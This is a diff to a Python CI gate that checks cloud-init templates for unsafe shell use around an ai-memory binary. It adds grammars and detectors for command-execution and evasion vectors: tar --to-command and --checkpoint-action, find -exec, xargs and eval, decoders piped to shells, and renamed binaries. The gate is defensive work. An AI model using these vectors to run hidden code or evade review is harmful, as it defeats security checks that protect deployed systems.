@@ -27,7 +27,11 @@ What runs, in order, for every template matching ``infra/*/cloud-init-memory*.tp
   * Line model (``parse_template``): the YAML structure is read line by line
     (top-level keys, write_files entries that each start with ``- path:``,
     literal ``content: |`` blocks only). A block is a script (``#!`` first
-    line), a systemd unit, or data. Script lines are joined at a trailing
+    line), a systemd unit, or data; it is data ONLY when rule R5 shows it is
+    never run (no execute bit, under ``DATA_HOMES``, and no statement runs its
+    path, a glob for it or a parent directory; see ``DATA_HOMES``), else it is
+    checked as a script with no shebang. A heredoc body is data under the same
+    test for the literal file ``cat`` writes it to, else script. Script lines are joined at a trailing
     backslash (trailing whitespace after it still joins: fail closed), quote
     state and heredocs are tracked with bash rules, and a full-line ``#``
     comment is exempt ONLY outside a quote, outside a heredoc body and not
@@ -58,6 +62,16 @@ What runs, in order, for every template matching ``infra/*/cloud-init-memory*.tp
     script, ``source`` of a substitution, a decoder (base64 -d, xxd -r,
     openssl -d) in a statement that runs a shell, and an unparsable statement
     that holds ``$`` or a backtick. A literal ``-c`` script is checked again.
+    For ``ai-memory`` (#4837 R12, a closed world): every word up to the
+    subcommand is a flag word, ``--``, or the value of a value-taking root flag
+    in the value grammar (``BARE_LITERAL_RE`` or ``QUOTED_VALUE_RE``; never a
+    terraform ``${expr}`` or ``%{ }``), and the subcommand is a bare literal.
+    A word naming the binary (by basename, or a variable assigned such a path)
+    is either the resolved command word or an operand of ``KNOWN_NONEXEC``; any
+    other command before it is an unknown wrapper and red, and cp/ln/mv/install
+    may not give the binary another name. A renamed binary that the template
+    never names (``/usr/local/bin/aim --db $X``) cannot be seen by name: that
+    case is covered by the allowlist review of the line, not by this rule.
   * Validators (``validate_line``), on every approved (non-pending) line: a
     postgres URL must end with the exact ``sslmode=verify-full`` both raw and
     as sqlx decodes the query (case-sensitive key, percent-decoded keys and
@@ -91,6 +105,7 @@ from __future__ import annotations
 
 import argparse
 import contextlib
+import fnmatch
 import gzip
 import hashlib
 import io
@@ -104,6 +119,31 @@ from pathlib import Path
 
 ROOT = Path(__file__).resolve().parent.parent
 SERVE_SRC = ROOT / "src" / "daemon_runtime.rs"
+# Root Cli flags of ai-memory that take a separate value word (src/daemon_runtime.rs:303-324).
+AI_MEMORY_VALUE_FLAGS = ("--db", "--agent-id", "--db-passphrase-file")
+# #4837 R12: a closed-world grammar for the words up to the ai-memory subcommand. A
+# value of a root flag is green ONLY when it is (a) a bare literal of these characters
+# with no leading ~, or (b) ONE double-quoted word of these characters and plain $NAME /
+# ${NAME} expansions. Everything else is red: arrays, ${X:-..} operators, globs, braces,
+# command substitution, backticks, $'..', $"..", adjacent quoted and unquoted parts,
+# single quotes, and any terraform ${expr} or %{ } (terraform pastes the value into the
+# script text before bash parses it, so no quoting contains it). The subcommand word
+# must be a bare literal. This closed-world form copies the precedent of memory d517ebcd
+# (root issue #4869) and memory 19497ef6.
+LITERAL_CLASS = r"A-Za-z0-9_./:@%+=,-"
+BARE_LITERAL_RE = re.compile(r"^(?!~)[" + LITERAL_CLASS + r"]+$")
+QUOTED_VALUE_RE = re.compile(
+    r'^"(?:[' + LITERAL_CLASS + r']|\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})*"$')
+FLAG_WORD_RE = re.compile(r"^-[-A-Za-z0-9]*$")
+# tf_render marks where a %{ } directive stood: the rendered text depends on the branch (#4837 R11).
+TF_DIRECTIVE_MARK = "\x02"
+# tf_render writes each terraform ${expr} as this expansion. Its name holds a control
+# character, which rules_1_to_4 refuses in a template, so no real script text (a shell
+# variable named TFVALUE included) can ever equal it (#4837 R12, #4968).
+TF_VALUE = "${tf\x03value}"
+# The C0 controls other than TAB and LF, and DEL. YAML_BREAK_RE already refuses CR, VT,
+# FF and FS/GS/RS; these are refused too so the gate's own markers stay unforgeable.
+CONTROL_RE = re.compile("[\x00-\x08\x0e-\x1b\x1f\x7f]")
 TEMPLATE_GLOB = "infra/*/cloud-init-memory*.tpl"
 ALLOW_FILE = ROOT / "scripts" / "qc-allowlists" / "cloud-init-token-allow.txt"
 HBA_CAT = 'cat "$HBA"; } > "$HBA.new"'
@@ -286,6 +326,8 @@ def rules_1_to_4(name: str, text: str, known: set) -> list:
     for lineno, line in enumerate(text.split("\n"), 1):
         if YAML_BREAK_RE.search(line):
             hits.append("%s:%d: a line break other than LF (YAML splits the line the gate reads as one)" % (name, lineno))
+        elif CONTROL_RE.search(line):
+            hits.append("%s:%d: a control character (reserved for the gate's terraform markers, #4837 R12)" % (name, lineno))
     for lineno, line in enumerate(text.splitlines(), 1):
         if any(ord(ch) > 127 for ch in line):
             hits.append("%s:%d: non-ASCII byte (cloud-init discards the config, #1880)" % (name, lineno))
@@ -306,7 +348,24 @@ def rules_1_to_4(name: str, text: str, known: set) -> list:
 
 # ---------------------------------------------------------------- bash lexing
 def norm(text: str) -> str:
-    return " ".join(text.split())
+    """The text an allow entry is compared with (#5097). Only whitespace that bash
+    would split words on collapses to one blank; whitespace inside quotes or after a
+    backslash is kept, and a kept newline is written as U+23CE, so an entry cannot
+    approve a line whose words differ from the line it was written for (a
+    backslash-newline continuation is not a backslash-blank, "a  b" is not "a b")."""
+    split = [False] * len(text)
+    for i, unquoted in _walk(text, None):
+        split[i] = unquoted and text[i].isspace()
+    out, blank = [], False
+    for i, c in enumerate(text):
+        if split[i]:
+            blank = bool(out)
+            continue
+        if blank:
+            out.append(" ")
+            blank = False
+        out.append("\u23ce" if c == "\n" else c)
+    return "".join(out)
 
 
 def _walk(s: str, state):
@@ -703,6 +762,8 @@ def unquote(w: str):
 
 ASSIGN_RE = re.compile(r"^[A-Za-z_]\w*(?:\[[^]]*\])?\+?=")
 REDIR_RE = re.compile(r"^(?:\d*|&)(?:<<<|<<-|<<|<>|>>|>\||>&|<&|&>>|&>|<|>)(.*)$", re.S)
+# a redirection target before the ai-memory subcommand that holds rendered terraform text (#5099)
+REDIR_TF_HIT = "ai-memory redirection target: a terraform value (its text can hold a space and so the subcommand)"
 KEYWORDS = {"if", "then", "do", "else", "elif", "while", "until", "!", "time", "{", "}", "fi", "done", "esac", "coproc"}
 SHELLS = {"sh", "bash", "dash", "zsh", "ksh", "mksh", "busybox"}
 INTERP_BASE_RE = re.compile(r"^(?:python[\d.]*|perl|ruby|node|nodejs|php|lua|tclsh|awk|gawk|mawk)$")
@@ -728,6 +789,688 @@ WRAPPERS = {
     "systemd-run": ({"-u", "--unit", "-p", "--property", "--description", "--slice", "-E", "--setenv", "--uid", "--gid", "-M", "--machine", "-H", "--host", "--working-directory", "--on-active", "--on-boot", "--on-calendar", "--timer-property", "--path-property", "--socket-property", "--service-type", "--nice"}, 0),
 }
 SCRIPT_OPTS = {"su": ("-c", "--command"), "runuser": ("-c", "--command"), "flock": ("-c", "--command"), "env": ("-S", "--split-string")}
+
+
+def unquoted_chars(w: str) -> str:
+    """The characters of one shell word that are neither quoted nor escaped."""
+    out, i, n = [], 0, len(w)
+    while i < n:
+        c = w[i]
+        if c == "\\":
+            i += 2
+            continue
+        if c == "'":
+            j = w.find("'", i + 1)
+            i = n if j < 0 else j + 1
+            continue
+        if c == '"':
+            j = dq_end(w, i + 1)
+            i = n if j < 0 else j + 1
+            continue
+        out.append(c)
+        i += 1
+    return "".join(out)
+
+
+def value_word_problem(w: str):
+    """None when w is in the closed value grammar (BARE_LITERAL_RE or QUOTED_VALUE_RE),
+    else why it is not. The reason text only names the first shape found; the verdict is
+    the grammar alone (#4837 R12)."""
+    if BARE_LITERAL_RE.match(w) or QUOTED_VALUE_RE.match(w):
+        return None
+    u = unquoted_chars(w)
+    if TF_DIRECTIVE_MARK in w:
+        why = "a terraform directive (the rendered quoting depends on the branch)"
+    elif TF_VALUE in w:
+        why = "a terraform interpolation (bash re-parses the rendered text; quoting cannot contain it)"
+    elif "`" in w or "$(" in w:
+        why = "a command substitution"
+    elif "$'" in w or '$"' in w:
+        why = "ANSI-C or locale quoting"
+    elif "'" in w:
+        why = "single quotes (only a bare literal or one double-quoted word passes)"
+    elif re.search(r"[*?\[{]", u):
+        why = "a glob or brace expansion (one word can become several)"
+    elif re.search(r"\$\{[^}]*[^A-Za-z0-9_}]", w):
+        why = "a parameter operator, array or indirection inside ${ }"
+    elif "$" in u:
+        why = "an unquoted expansion (word split)"
+    elif w.startswith("~"):
+        why = "a tilde expansion"
+    else:
+        why = "a word outside the grammar [%s] / one double-quoted word of those and $NAME" % LITERAL_CLASS
+    return "%s in %r" % (why, w[:40])
+
+
+# ---------------------------------------------------------------- #4837 R12: R4 operands
+# Commands known never to run an operand. A word naming the ai-memory binary may be an
+# operand of these only; any other word before it on the simple command (taskset, doas,
+# time -p, unshare, prlimit, numactl, setpriv, ...) is an unknown wrapper: red.
+KNOWN_NONEXEC = {"chmod", "chown", "chgrp", "mkdir", "test", "[", "[[", "stat", "useradd", "tar", "systemctl",
+                 "ls", "rm", "cp", "ln", "mv", "install"}
+COPY_CMDS = {"cp": {"-S", "--suffix"}, "ln": {"-S", "--suffix"}, "mv": {"-S", "--suffix"},
+             "install": {"-m", "-o", "-g", "-S", "--mode", "--owner", "--group", "--suffix"}}
+TAR_EXEC_OPTS = ("-I", "-F", "--use-compress-program", "--to-command", "--checkpoint-action", "--info-script",
+                 "--new-volume-script", "--rsh-command", "--rmt-command")
+# tar options that rename members as they are written: the gate finds the binary by its
+# name, so a rename hides it (#5093). GNU tar takes any unambiguous prefix of a long option.
+TAR_RENAME_OPTS = ("--transform", "--xform", "--rename")
+TAR_ENV_HIT = "TAR_OPTIONS set: tar reads options from it, so it can rename members or run a program"
+BUILT_NAME_HIT = ("variable name built from an expansion (the gate cannot read which name it sets, "
+                  "and TAR_OPTIONS is one)")
+# options that take a value (not a name) as the next word, per name-taking builtin (#5326)
+# (env -S splits its value into assignments, so it is read as a name word)
+BUILT_NAME_VALUE_OPTS = {"read": "dnNptui", "mapfile": "dnOsuCc", "readarray": "dnOsuCc", "env": "uC"}
+
+
+def expanded(word: str) -> bool:
+    """True when the word holds a parameter expansion or a command substitution."""
+    return "$" in word or "`" in word
+
+
+def built_name(text: str) -> bool:
+    """True when a builtin that sets a variable by name (export, declare, typeset, local,
+    readonly, env, read, mapfile, readarray, getopts, printf -v) is given a name, or an
+    option, built from an expansion (#5326). The TAR_OPTIONS check reads the literal name
+    only, and "${N}IONS" or "TAR_$T" can be that name; fail closed (#4869)."""
+    plain = re.sub(r"[\"'\\]", "", text)
+    for m in re.finditer(r"(?<![\w$./-])(export|declare|typeset|local|readonly|env|read|mapfile|readarray"
+                         r"|getopts|printf)(?![\w-])([^;&|\n]*)", plain):
+        cmd, words, i = m.group(1), m.group(2).split(), 0
+        if cmd == "printf":
+            if words[:1] == ["--"]:
+                words = words[1:]
+            if words[:1] == ["-v"] and len(words) > 1 and expanded(words[1]):
+                return True
+            if words[:1] and words[0].startswith("-v") and expanded(words[0]):
+                return True
+            continue
+        if cmd == "getopts":
+            if len(words) > 1 and expanded(words[1]):
+                return True
+            continue
+        while i < len(words):
+            w = words[i]
+            if re.match(r"\d*(<<<|<<-?|<>|>>|>\||[<>]&?)$", w):
+                i += 2
+                continue
+            if re.match(r"\d*[<>]", w):
+                i += 1
+                continue
+            if w.startswith("-") and not expanded(w):
+                arg = BUILT_NAME_VALUE_OPTS.get(cmd, "")
+                i += 2 if w[-1:] in arg and len(w) == 2 else 1
+                continue
+            if expanded(w.split("=", 1)[0]):
+                return True
+            if cmd == "env" and "=" not in w:
+                break
+            i += 1
+    return False
+
+# short tar options that run a program or rename (bsdtar -s), alone or in a cluster
+TAR_EXEC_SHORT = "IFs"
+# short tar options that take a value: the rest of the cluster, or else the next word
+TAR_ARG_SHORT = "bCfFgHIKLNTVX"
+# find actions that run a command per file: its operands come from the file system (#5093)
+FIND_EXEC_ACTIONS = {"-exec", "-execdir", "-ok", "-okdir"}
+
+
+def tar_risky(args: list):
+    """The first tar argument that runs a program or renames members, or None (#5093):
+    an exec or rename long option or any prefix of one, or a short option cluster (also
+    the dashless first-argument form) holding I, F or s. Each word is read after quote
+    removal (bash hands tar --transform for --"tra"nsform), redirections are skipped, and
+    the words that short options in TAR_ARG_SHORT take as their value are consumed. A
+    word whose option name, or whose start, is an expansion can be any option, and GNU
+    tar takes options anywhere, so it is refused too (fail closed, #5328)."""
+    k, take = 0, 0
+    while k < len(args):
+        raw = args[k]
+        rm = REDIR_RE.match(raw)
+        if rm is not None and not raw.startswith(("<(", ">(")):
+            k += 1 if rm.group(1) else 2
+            continue
+        a, exp = unquote(raw)
+        first = k == 0
+        k += 1
+        if take:
+            take -= 1
+            continue
+        if a == "--" and not exp:
+            break
+        if exp and a[:1] in "$`":
+            return raw
+        if a.startswith("--"):
+            key = a.split("=", 1)[0]
+            if exp and expanded(key):
+                return raw
+            if len(key) > 3 and any(o.startswith(key) for o in TAR_EXEC_OPTS + TAR_RENAME_OPTS if o.startswith("--")):
+                return raw
+            continue
+        if re.fullmatch(r"-[A-Za-z]\S*", a) or (first and re.fullmatch(r"[A-Za-z]+", a)):
+            letters = a.lstrip("-")
+            if any(c in TAR_EXEC_SHORT for c in re.match(r"[A-Za-z]*", letters).group(0)):
+                return raw
+            if a.startswith("-"):
+                m = re.match(r"([^%s]*)([%s]?)(.*)" % (TAR_ARG_SHORT, TAR_ARG_SHORT), letters)
+                if exp and expanded(m.group(1)):
+                    return raw
+                take = 1 if m.group(2) and not m.group(3) else 0
+            else:
+                take = sum(c in TAR_ARG_SHORT for c in letters)
+    return None
+
+
+def mask_expansions(val: str) -> str:
+    """val with each expansion ($NAME, ${..}, $(..), $((..)), backticks, $@ ...) replaced by
+    one U+0001 mark, which stands for any text (#5094)."""
+    out, i, n = [], 0, len(val)
+    while i < n:
+        c = val[i]
+        if c == "`":
+            j = val.find("`", i + 1)
+            i = n if j < 0 else j + 1
+            out.append("\x01")
+            continue
+        if c == "$" and i + 1 < n:
+            d = val[i + 1]
+            if d in "({":
+                close, depth, j = (")" if d == "(" else "}"), 0, i + 1
+                while j < n:
+                    if val[j] == d:
+                        depth += 1
+                    elif val[j] == close:
+                        depth -= 1
+                        if depth == 0:
+                            break
+                    j += 1
+                i = j + 1
+                out.append("\x01")
+                continue
+            m = re.match(r"[A-Za-z_]\w*|[0-9@*#?$!-]", val[i + 1:])
+            if m is not None:
+                i += 1 + m.end()
+                out.append("\x01")
+                continue
+        out.append(c)
+        i += 1
+    return "".join(out)
+
+
+def built_name_matches(val: str, globs: bool = True) -> bool:
+    """True when a word the shell builds (a brace or glob) can expand to a path whose
+    basename is ai-memory (fail closed, #5093). Braces are expanded first, so a brace that
+    holds a slash is read whole; a range, or more than 64 words, counts as any text."""
+    alts, rounds = [mask_expansions(val)], 0
+    while globs and rounds < 16 and any(re.search(r"\{[^{}]*\}", a) for a in alts):
+        rounds += 1
+        nxt = []
+        for a in alts:
+            m = re.search(r"\{([^{}]*)\}", a)
+            if m is None:
+                nxt.append(a)
+            elif ".." in m.group(1) or "," not in m.group(1):
+                # a range, or a literal {x}: stands for any text here (fail closed)
+                nxt.append(a[:m.start()] + "*" + a[m.end():])
+            else:
+                nxt.extend(a[:m.start()] + alt + a[m.end():] for alt in m.group(1).split(","))
+        alts = nxt
+        if len(alts) > 64:
+            return True
+    for a in alts:
+        pat = re.sub(r"\[[^]]*\]?|\*|\x01" if globs else r"\x01", "\0", posixpath.basename(a))
+        pat = "".join(".*" if c == "\0" else ("." if c == "?" and globs else re.escape(c)) for c in pat)
+        if re.fullmatch(pat, "ai-memory", re.S) is not None:
+            return True
+    return False
+
+
+# commands and keywords that never run an operand: they print it, fetch it as a URL, or
+# match or loop over it as text, so a bare unresolved expansion is safe there (#5094)
+PRINT_ONLY = {"echo", "printf", "curl", "for", "case", "select"}
+
+
+class VarFacts(frozenset):
+    """The tracked binary names (the set) plus .resolved: the names whose every value the
+    gate can read (#5094). None means unknown, and then no name is resolved."""
+    resolved = None
+
+
+def bare_operand_problem(words: list, idx, bins):
+    """#5094 closed world: an operand that is one bare expansion ("$X", ${X}, $(..)) of a
+    command that may run it must have a value the gate can read. A named variable that is
+    only set by a substitution, read, mapfile, printf -v, getopts, a loop over such a
+    value, or never set in the template is unresolved, and so is a substitution itself.
+    Positional parameters resolve at the call site, whose operands this same rule reads."""
+    if idx is None:
+        return None
+    base = posixpath.basename(unquote(words[idx])[0])
+    if base in KNOWN_NONEXEC or base in PRINT_ONLY or base == "ai-memory":
+        return None
+    resolved = getattr(bins, "resolved", None) or frozenset()
+    runner = base in SHELLS or base in STDIN_RUNNERS or INTERP_BASE_RE.match(base) is not None
+    k = idx + 1
+    while k < len(words):
+        w = words[k]
+        rm = REDIR_RE.match(w)
+        if rm is not None and not w.startswith(("<(", ">(")):
+            op = w[:len(w) - len(rm.group(1))]
+            tgt = rm.group(1) or (words[k + 1] if k + 1 < len(words) else "")
+            k += 1 if rm.group(1) else 2
+            # a shell or interpreter runs what its stdin redirection or here-string names
+            # (#5095): that target must resolve like an operand; a heredoc body is read
+            # by rule R3 as script text
+            if not (runner and "<" in op and ">" not in op and not re.fullmatch(r"\d*<<-?", op)):
+                continue
+            w = tgt
+        else:
+            k += 1
+        val, exp = unquote(w)
+        if not exp or mask_expansions(val) != "\x01":
+            continue
+        # only a plain $X or ${X} reads a resolved name's value: an operator, default,
+        # indirection, length, case or subscript form builds other text (fail closed, #5173)
+        m = re.fullmatch(r"\$(?:([A-Za-z_]\w*)|\{([A-Za-z_]\w*)\})", val)
+        if m is None and re.fullmatch(r"\$(?:[0-9@*#?$!-]|\{(?:[0-9]+|[@*#?$!-])\})", val):
+            continue
+        name = None if m is None else (m.group(1) or m.group(2))
+        if name is None or (name not in resolved and name not in bins):
+            return ("%r is an operand of %r whose value the gate cannot read (an unresolved expansion may "
+                    "name the ai-memory binary)" % (w[:40], base))
+    return None
+
+
+def binary_ref(w: str, bins, shells: bool = False) -> bool:
+    """True when w is one word naming the ai-memory binary: its text's basename is
+    ai-memory, or it is exactly the expansion of a variable the template assigns such
+    a path to. With shells, a shell or interpreter name counts too (it can run one)."""
+    val, exp = unquote(w)
+    # $B, ${B} and every operator form ${B%x}, ${B:-x}, ${#B}, ${!B}, ${B[0]} of a tracked
+    # name (#5094); checked before the space test, since an operator word may hold one
+    if any(re.fullmatch(r"\$" + re.escape(b) + r"|\$\{[#!]?" + re.escape(b) + r"(?:[^A-Za-z0-9_].*)?\}", val, re.S)
+           for b in bins):
+        return True
+    masked = mask_expansions(val) if exp else val
+    if re.search(r"\s", masked):
+        return False
+    # a data home (/etc/ai-memory) shares the binary's basename. It stays a binary
+    # reference here (fail closed: a file can be installed at that path); running a
+    # data home is also an R5 hit, which the #4998 probe requires to be reported.
+    base = posixpath.basename(val)
+    if base == "ai-memory" or (shells and (base in SHELLS or INTERP_BASE_RE.match(base))):
+        return True
+    # only an unquoted glob or brace is expanded by the shell; a quoted one is literal text
+    globs = re.search(r"[*?\[{]", unquoted_chars(w)) is not None
+    if globs and built_name_matches(val):
+        return True
+    # a name built from an expansion (/dir/$N, ai-$V, ${D}ai-memory) may be ai-memory: each
+    # expansion stands for any text (#5094). A bare expansion with no slash and no literal
+    # text is the unresolved-variable case, decided by bare_operand_problem.
+    if exp and "\x01" in masked and ("/" in masked or re.search(r"[^\x01]", posixpath.basename(masked))):
+        return built_name_matches(val, globs)
+    return False
+
+
+def copy_problem(base: str, args: list, bins):
+    """cp/ln/mv/install that copies the binary to another name (#4837 R12)."""
+    opts, ops, target_dir, k = COPY_CMDS[base], [], False, 0
+    while k < len(args):
+        a = args[k]
+        rm = REDIR_RE.match(a)
+        if rm is not None and not a.startswith(("<(", ">(")):
+            k += 1 if rm.group(1) else 2
+            continue
+        if a == "--":
+            ops.extend(args[k + 1:])
+            break
+        if a.startswith("-") and a != "-":
+            key = a.split("=", 1)[0]
+            if base == "install" and (key == "--directory" or (not a.startswith("--") and "d" in a[1:])):
+                return None
+            if key in ("-t", "--target-directory") or (not a.startswith("--") and a[1:].endswith("t") and len(a) > 2):
+                target_dir = True
+            k += 2 if (key in opts or key in ("-t", "--target-directory")) and "=" not in a and len(key) == len(a) else 1
+            continue
+        ops.append(a)
+        k += 1
+    if any(binary_ref(o, bins) for o in ops) and any(re.search(r"[*?\[{]", unquote(o)[0]) for o in ops):
+        return "%s copies the ai-memory binary with a brace or glob operand (the copy's name is not readable)" % base
+    if target_dir or len(ops) < 2:
+        return None
+    dest = unquote(ops[-1])[0]
+    if any(binary_ref(src, bins) for src in ops[:-1]) and not dest.endswith("/") and posixpath.basename(dest) != "ai-memory":
+        return "%s copies the ai-memory binary to another name %r (the gate finds the binary by its name)" % (base, ops[-1][:40])
+    return None
+
+
+def operand_problem(words: list, idx, bins):
+    """#4837 R4/R12: a word naming the binary must be the resolved command word, or an
+    operand of a command known never to run it."""
+    base = None if idx is None else posixpath.basename(unquote(words[idx])[0])
+    shells = base not in KNOWN_NONEXEC and base != "ai-memory"
+    refs, k = [], 0
+    while k < len(words):
+        w = words[k]
+        rm = REDIR_RE.match(w)
+        if rm is not None and not w.startswith(("<(", ">(")):
+            k += 1 if rm.group(1) else 2
+            continue
+        if k != idx and not ASSIGN_RE.match(w) and binary_ref(w, bins, shells):
+            refs.append(k)
+        k += 1
+    if base == "tar":
+        risky = tar_risky(words[idx + 1:])
+        if risky is not None:
+            # the archive's members are not visible here: a program option or a rename is
+            # red whatever the operands name (#5093)
+            return "tar option %r runs a program or renames members (the gate finds the binary by its name)" % risky[:40]
+    if base == "find" and any(unquote(a)[0] in FIND_EXEC_ACTIONS for a in words[idx + 1:]):
+        return "find runs a command per file (its operands come from the file system, so a copy's name is not readable)"
+    if base in COPY_CMDS and any(posixpath.basename(unquote(w)[0]) == "xargs" for w in words[:idx]):
+        return "%s under xargs (its operands come from stdin, so a copy's name is not readable)" % base
+    if not refs:
+        return None
+    if base == "ai-memory":
+        return None
+    if base in COPY_CMDS:
+        return copy_problem(base, words[idx + 1:], bins)
+    if base in KNOWN_NONEXEC or base == "tar":
+        # tar's program and rename options are refused above whatever the operands name;
+        # without one, tar only archives or lists the binary
+        return None
+    lead = " ".join(words[:refs[0]])
+    return ("ai-memory is run by or an operand of %r: unknown wrapper (only NAME=value prefixes, %s and the "
+            "non-executing %s are understood)" % (lead[:60], "/".join(sorted(WRAPPERS)), "/".join(sorted(KNOWN_NONEXEC))))
+
+
+# ---------------------------------------------------------------- #4837 R12: R5 data files
+# A write_files block or heredoc body is DATA (its lines are text, a template value in its
+# command word is not a command) ONLY when the gate can show it is never run. The test:
+#   1. a write_files block has no shebang, is not a unit, and its permissions parse as
+#      octal with no execute bit (absent is the 0644 default; unparsable is executed);
+#      a heredoc body is fed to plain ``cat`` whose one output redirect is a literal path
+#      (a variable assigned exactly once to a literal is substituted);
+#   2. the path is under a DATA_HOMES directory, whose readers parse the file as
+#      configuration and never run it (cron.d, profile.d, apt.conf.d, udev rules and the
+#      like run their contents, so any other place is executed);
+#   3. no statement of the template uses the path, a glob matching it or a parent
+#      directory of it, except as an output-redirect target or an operand of DATA_SAFE,
+#      chmod with a mode that has no execute bit, install -d, or sed with one literal
+#      s-command script that has no e or w flag and whose output is not redirected or piped.
+# Anything else is executed: its lines are checked as script lines. A no-shebang file that
+# a later line runs (bash PATH, PATH as a command, . PATH, ExecStart=PATH) is executed.
+DATA_HOMES = ("/etc/ai-memory/", "/opt/ai-memory/.config/ai-memory/", "/etc/pgbouncer/")
+# commands that run the words or text they read on stdin (#5095)
+STDIN_RUNNERS = {"xargs", "parallel", "source", ".", "eval", "env"}
+DATA_SAFE = {"chown", "chgrp", "test", "[", "[[", "stat", "ls", "rm", "echo", "printf", "tee", "mkdir", "useradd"}
+SED_SUBST_RE = re.compile(r"^s([^\\\n])(?:\\.|(?!\1).)*\1(?:\\.|(?!\1).)*\1[gpI0-9]*$", re.S)
+
+
+def mode_has_x(mode: str) -> bool:
+    """True when a chmod/install mode word grants execute (or cannot be read)."""
+    m = unquote(mode)[0]
+    if re.fullmatch(r"[0-7]{1,4}", m):
+        return int(m, 8) & 0o111 != 0
+    return not re.fullmatch(r"[ugoa]*[-+=][rwstugo]*(?:,[ugoa]*[-+=][rwstugo]*)*", m)
+
+
+def sed_reads_only(args: list, term: str) -> bool:
+    if term == "|":
+        return False
+    scripts, k = [], 0
+    while k < len(args):
+        a = args[k]
+        rm = REDIR_RE.match(a)
+        if rm is not None and not a.startswith(("<(", ">(")):
+            if ">" in a[:len(a) - len(rm.group(1))]:
+                return False
+            k += 1 if rm.group(1) else 2
+            continue
+        if a in ("-n", "-E", "-r", "--quiet", "--silent"):
+            k += 1
+            continue
+        if a == "-e":
+            scripts.append(args[k + 1] if k + 1 < len(args) else "")
+            k += 2
+            continue
+        if a.startswith("-"):
+            return False
+        if not scripts:
+            scripts.append(a)
+        k += 1
+    if len(scripts) != 1:
+        return False
+    s = scripts[0]
+    return (len(s) > 2 and s[0] == "'" and s[-1] == "'" and "'" not in s[1:-1]
+            and SED_SUBST_RE.match(s[1:-1]) is not None)
+
+
+def literal_consts(stmts: list) -> dict:
+    """NAME -> value for every variable assigned exactly once, to a bare literal, and
+    named nowhere else except as $NAME / ${NAME}."""
+    texts = [tf_render(s) for _w, s, _st in stmts]
+    whole = "\n".join(texts)
+    out = {}
+    for m in re.finditer(r"(?<![\w$])([A-Za-z_]\w*)=(\S+)", whole):
+        name, val = m.group(1), m.group(2)
+        if name in out or not BARE_LITERAL_RE.match(val):
+            continue
+        if len(re.findall(r"(?<![\w${])" + re.escape(name) + r"(?!\w)", whole)) == 1:
+            out[name] = val
+    return out
+
+
+def subst_consts(w: str, consts: dict) -> str:
+    def rep(m):
+        return consts.get(m.group(1) or m.group(2), m.group(0))
+    return re.sub(r"\$\{([A-Za-z_]\w*)\}|\$([A-Za-z_]\w*)", rep, w)
+
+
+def writes_out(words: list) -> bool:
+    """True when the command's output goes to a file other than /dev/null (#5096)."""
+    k = 0
+    while k < len(words):
+        w = words[k]
+        rm = REDIR_RE.match(w)
+        if rm is not None and not w.startswith(("<(", ">(")):
+            op = w[:len(w) - len(rm.group(1))]
+            tgt = unquote(rm.group(1) or (words[k + 1] if k + 1 < len(words) else ""))[0]
+            if ">" in op and "<" not in op and not re.fullmatch(r"\d*>&\d*-?", op + tgt) and tgt != "/dev/null":
+                return True
+            k += 1 if rm.group(1) else 2
+            continue
+        k += 1
+    return False
+
+
+def path_uses(stmt: str, consts: dict, out: list, depth: int = 0, in_sub: bool = False) -> None:
+    """Append (text, safe) for every word of stmt, its -c scripts and substitutions.
+    Nothing is safe in a command (other than chmod/chown/chgrp/mkdir, which print no
+    content) or a { } / ( ) group whose output goes to a file, in tee's stdin, or for
+    echo/printf/tee inside a substitution, whose output becomes words (#5096: a safe
+    read must not be a copy)."""
+    t = tokenize(stmt) if depth <= 8 else None
+    if t is None:
+        out.append((subst_consts(stmt, consts), False))
+        return
+    cmds, subs, _ansi = t
+    grouped_out, prev = False, ""
+    for words, _pipe_in, term in cmds:
+        if (words[:1] in (["}"], [")"]) or prev == ")") and writes_out(words):
+            grouped_out = True
+        prev = term
+    for ci, (words, _pipe_in, term) in enumerate(cmds):
+        idx, scripts = resolve(words)
+        for sv, _sexp in scripts:
+            path_uses(sv, consts, out, depth + 1)
+        base = None if idx is None else posixpath.basename(unquote(words[idx])[0])
+        rest = [] if idx is None else words[idx + 1:]
+        if base in SHELLS or (base is not None and INTERP_BASE_RE.match(base)):
+            has_c, sw = shell_script_word(base, rest)
+            if has_c and sw is not None:
+                path_uses(unquote(sw)[0], consts, out, depth + 1)
+        safe = base in DATA_SAFE and not (in_sub and base in ("echo", "printf", "tee"))
+        nxt = cmds[ci + 1][0] if term == "|" and ci + 1 < len(cmds) else None
+        if nxt:
+            # words piped into a shell, an interpreter or xargs are run, not data (#5095)
+            # the wrappers too: resolve() looks through xargs and env to the command they run
+            ni, _ns = resolve(nxt)
+            fi = skip_prefix(nxt, 0)
+            last = fi if ni is None else max(ni, fi)
+            for nw in nxt[fi:last + 1]:
+                nb = posixpath.basename(unquote(nw)[0])
+                if nb in SHELLS or nb in STDIN_RUNNERS or INTERP_BASE_RE.match(nb):
+                    safe = False
+        if base == "chmod":
+            # a mode with an execute bit makes the named file runnable; on a parent
+            # directory it only grants traversal, so it counts for an exact match only
+            mode = next((a for a in rest if not a.startswith("-")), "")
+            recursive = any(a == "--recursive" or re.fullmatch(r"-[A-Za-z]*R[A-Za-z]*", a) for a in rest)
+            safe = True if not mode_has_x(mode) else (False if recursive else "exact")
+        elif base == "install":
+            safe = any(a == "--directory" or (re.fullmatch(r"-[A-Za-z]+", a) is not None and "d" in a) for a in rest)
+        elif base == "sed":
+            safe = sed_reads_only(rest, term)
+        if grouped_out or (writes_out(words) and base not in ("chmod", "chown", "chgrp", "mkdir")):
+            safe = False
+        k = 0
+        while k < len(words):
+            w = words[k]
+            for s in subs:
+                w = w.replace(s, "")
+            rm = REDIR_RE.match(w)
+            if rm is not None and not w.startswith(("<(", ">(")):
+                op = w[:len(w) - len(rm.group(1))]
+                tgt = rm.group(1) or (words[k + 1] if k + 1 < len(words) else "")
+                writes = ">" in op and "<" not in op
+                # tee copies its standard input to its file operands: reading a path is a copy
+                out.append((unquote(subst_consts(tgt, consts))[0], writes or (safe and base != "tee")))
+                k += 1 if rm.group(1) else 2
+                continue
+            if (idx is None or k < idx) and ASSIGN_RE.match(w):
+                # an assignment the consts substitute is followed through its uses
+                name = re.match(r"[A-Za-z_]\w*", w).group(0)
+                out.append((unquote(subst_consts(w.split("=", 1)[1], consts))[0], name in consts))
+            else:
+                out.append((unquote(subst_consts(w, consts))[0], safe if k != idx else False))
+            k += 1
+    for s in subs:
+        path_uses(s, consts, out, depth + 1, True)
+
+
